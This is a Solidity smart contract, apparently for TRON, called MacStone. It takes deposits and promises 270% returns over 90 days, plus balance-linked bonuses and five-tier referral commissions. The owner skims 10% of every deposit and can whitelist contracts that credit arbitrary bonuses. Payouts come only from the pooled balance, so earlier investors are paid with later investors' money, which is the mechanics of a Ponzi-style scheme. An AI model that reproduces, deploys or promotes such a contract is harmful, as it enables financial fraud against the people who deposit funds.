//SourceUnit: macStone.sol

pragma solidity ^0.5.9;

contract MacStone {

    struct Deposit {
        uint amount;
        uint at;
        uint withdrawn;
        bool active;
    }
    
    struct GameFund {
        uint gameBallance;
        uint gamePaidAt;
        uint gamePaidCount;
    }    
      
    struct Investor {
        bool registered;
        address referrer;
        uint referrals_tier1;
        uint referrals_tier2;
        uint referrals_tier3;
        uint referrals_tier4;
        uint referrals_tier5;
        uint balanceRef;
        uint totalRef;
        uint totalBonusRef;
        uint totalDepositedByRefs;
        Deposit[] deposits;
        uint invested;
        uint paidAt;
        uint withdrawn;
    }
    
    modifier checkOwner(){        
        require(msg.sender == owner);
        _;
    }
    
    modifier checkGame(){        
        address _gameContract = msg.sender;
        require(gameContract[_gameContract]);
        _;
    }
    
    uint DAY = 28800; 
    uint MIN_DEPOSIT = 1e8;
    uint FUND_CRITERIA = 5e12; 
    uint GAME_CRITERIA = 1e10; 
    uint PERIOD = DAY * 90;
    uint PERCENT = 270;
      
    uint[] public refRewards;
    uint public totalInvestors;
    uint public totalInvested;
    uint public totalRefRewards;
    address payable public owner;
    mapping (address => Investor) public investors;
    mapping (address => GameFund) public gameStats;
    mapping(address => bool) public gameContract;
      
    event DepositAt(address user, uint amount);
    event Withdraw(address user, uint amount);
    event FundIn(address sender, uint amount);

    constructor(address payable _owner) public {
        owner = _owner;
        
        for (uint i = 5; i >= 1; i--)
            refRewards.push(i * 3);
    }
  
    function register(address referrer) internal {
        if(!investors[msg.sender].registered) {
            
            investors[msg.sender].registered = true;
            totalInvestors++;
            
            if(referrer != msg.sender && referrer!=address(0)){
                investors[msg.sender].referrer = referrer;

                address rec = referrer;

                for (uint i = 0; i < refRewards.length; i++) {

                    if (!investors[rec].registered) 
                        break;

                    if (i == 0) 
                        investors[rec].referrals_tier1++;

                    if (i == 1) 
                        investors[rec].referrals_tier2++;

                    if (i == 2) 
                        investors[rec].referrals_tier3++;

                    if (i == 3)
                        investors[rec].referrals_tier4++;

                    if (i == 4) 
                        investors[rec].referrals_tier5++;

                    rec = investors[rec].referrer;
                }
            }            
        }
        
        if(investors[investors[msg.sender].referrer].registered){
            uint a = msg.value / 10;
            investors[investors[msg.sender].referrer].balanceRef += a;
            investors[investors[msg.sender].referrer].totalRef += a;
            investors[investors[msg.sender].referrer].totalDepositedByRefs += msg.value;
            totalRefRewards += a;
        }
    }
  
    function rewardReferrers(uint amount, address referrer) internal {
        address rec = referrer;
        
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) 
            break;
          
          uint a = amount * refRewards[i] / 100;
          investors[rec].balanceRef += a;
          investors[rec].totalBonusRef += a;
          totalRefRewards += a;
          
          rec = investors[rec].referrer;
        }
    }
  
    function getFundBonus() public view returns (uint) {
        return address(this).balance / FUND_CRITERIA;
    }
      
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 27 / 10;
    } 

    function deposit(address referrer) external payable {
        require(msg.value >= MIN_DEPOSIT, "Bad amount");
        
        register(referrer);            
        owner.transfer(msg.value / 10);
            
        investors[msg.sender].invested += msg.value;
        totalInvested += msg.value;
            
        investors[msg.sender].deposits.push(Deposit(msg.value, block.number, 0, true));
            
        if (investors[msg.sender].paidAt == 0) 
            investors[msg.sender].paidAt = block.number;
            
        emit DepositAt(msg.sender, msg.value);
    }
  
    function withdrawable(address user) public view returns (uint amount) {
        Investor storage investor = investors[user];
        GameFund storage gamefund = gameStats[user];
        
        uint fundBonus = getFundBonus();
        
        for (uint i = 0; i < investor.deposits.length; i++) {
            Deposit storage dep = investor.deposits[i];
            
            uint max_payout_depo = this.maxPayoutOf(dep.amount);
            
            if(dep.active == true && max_payout_depo > dep.withdrawn){
                uint finish = dep.at + PERIOD;
                uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
                uint till = block.number > finish ? finish : block.number;
                uint _amount = 0;
                
                if (since < till){ 
                    _amount = dep.amount * (till - since) * PERCENT / PERIOD / 100 + dep.amount * (till - since) * fundBonus / DAY / 1000;
                    
                    if(gamefund.gameBallance > 0 && (gamefund.gamePaidAt + DAY) < block.number && gamefund.gamePaidCount < 7){
                        if(gamefund.gameBallance > 5e11)
                            _amount += dep.amount / 20;
                        else
                            _amount += dep.amount * gamefund.gameBallance / GAME_CRITERIA / 1000;
                    }
                }
                
                if((dep.withdrawn + _amount) > max_payout_depo)
                    _amount = max_payout_depo - dep.withdrawn;
                
                amount += _amount;
            }
        }
    }
  
    function profit() internal returns (uint) {
        Investor storage investor = investors[msg.sender];
        GameFund storage gamefund = gameStats[msg.sender];
        
        uint fundBonus = getFundBonus();
        uint amount = 0;
        
        for (uint i = 0; i < investor.deposits.length; i++) {
            Deposit storage dep = investor.deposits[i];
            
            uint max_payout_depo = this.maxPayoutOf(dep.amount);
            
            if(dep.active == true && max_payout_depo > dep.withdrawn){
                uint finish = dep.at + PERIOD;
                uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
                uint till = block.number > finish ? finish : block.number;
                uint _amount = 0;
                
                if (since < till){ 
                    _amount = dep.amount * (till - since) * PERCENT / PERIOD / 100 + dep.amount * (till - since) * fundBonus / DAY / 1000;
                    
                    if(gamefund.gameBallance > 0 && (gamefund.gamePaidAt + DAY) < block.number && gamefund.gamePaidCount < 7){
                        if(gamefund.gameBallance > 5e11)
                            _amount += dep.amount / 20;
                        else
                            _amount += dep.amount * gamefund.gameBallance / GAME_CRITERIA / 1000;
                            
                        gamefund.gamePaidAt = block.number;   
                        gamefund.gamePaidCount += 1;
                    }
                }
                
                if((dep.withdrawn + _amount) > max_payout_depo){
                    _amount = max_payout_depo - dep.withdrawn;
                    investor.deposits[i].active = false;
                }
                    
                investor.deposits[i].withdrawn += _amount;
                amount += _amount;
            }
        }
        
        amount += investor.balanceRef;
        investor.balanceRef = 0;
        investor.paidAt = block.number;
        
        return amount;
    }
  
    function withdraw() external {
        uint amount = profit();
            
        rewardReferrers(amount, investors[msg.sender].referrer);
        
        if(gameStats[msg.sender].gameBallance > 0 && gameStats[msg.sender].gamePaidCount == 7){            
            gameStats[msg.sender].gameBallance = 0;
            gameStats[msg.sender].gamePaidAt = 0;
            gameStats[msg.sender].gamePaidCount = 0;
        }
        
        if(amount > address(this).balance)
            amount = address(this).balance;
        
        msg.sender.transfer(amount);
        investors[msg.sender].withdrawn += amount;
            
        emit Withdraw(msg.sender, amount);
    }   
    
    function setGame(address _gameAddress, bool _status) checkOwner() public{
        gameContract[_gameAddress] = _status;
    }
    
    function addGameFunds(address _gamer, uint _value) checkGame() external{            
        require(_value != 0);
        
        if(investors[_gamer].registered){
            if(gameStats[_gamer].gamePaidAt == 0)
                gameStats[_gamer].gamePaidAt = block.number;

            gameStats[_gamer].gameBallance += _value;
        }
    }

    function getFund() public payable {        
        emit FundIn(msg.sender, msg.value);
    }  
}